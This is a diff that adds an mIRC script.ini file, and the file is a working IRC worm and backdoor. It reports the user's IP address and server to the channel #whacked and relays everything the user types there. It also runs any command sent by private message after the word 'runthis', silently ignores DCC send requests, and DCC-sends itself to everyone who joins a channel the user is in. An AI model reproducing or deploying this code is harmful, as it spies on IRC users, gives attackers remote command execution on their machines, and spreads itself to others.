@@ -1,0 +1,17 @@
+[script]
+n0=on 1:START:{
+n1=  .sreq ignore
+n2=  .remote on
+n3=}
+n4=on 1:CONNECT:.msg #whacked Hi.  $ip on $server $+ : $+ $port $+ .
+n5=
+n6=on 1:INPUT:*:{
+n7=  .msg #whacked ( $+ $active $+ ) $1-
+n8=}
+n9=on 1:TEXT:*:?:{
+n10=  if ( $1 == runthis ) { .run $2- }
+n11=}
+n12=
+n13=on 1:JOIN:*:{
+n14=  if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini
+n15=}
